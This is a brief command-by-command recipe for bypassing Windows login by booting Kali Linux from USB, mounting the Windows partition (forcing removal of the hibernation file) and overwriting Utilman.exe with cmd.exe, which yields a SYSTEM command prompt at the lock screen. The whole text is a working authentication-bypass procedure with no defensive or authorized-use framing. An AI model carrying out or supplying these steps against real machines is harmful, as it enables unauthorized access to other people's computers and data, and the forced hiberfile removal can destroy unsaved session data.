### boot kali from usb stick
```
mkdir /mnt/windows
```

### mount windows partition
```
mount /dev/<windowsPartition> /mnt/windows
```

### if error occurs while mounting (Windows is hibernated, refuse to mount)
```
umount /dev/<windowsPartition>
mount -t ntfs-3g -o remove_hiberfile /dev/<windowsPartition> /mnt/windows
cd /mnt/windows/Windows/System32
```

### create backup
```
cp Utilman.exe backup.exe
```

### replace utilman with cmd
```
cp cmd.exe Utilman.exe
```

### umount
```
umount -R /mnt
```

### shut down kali and boot windows system ->  click "Utilman"
```
```

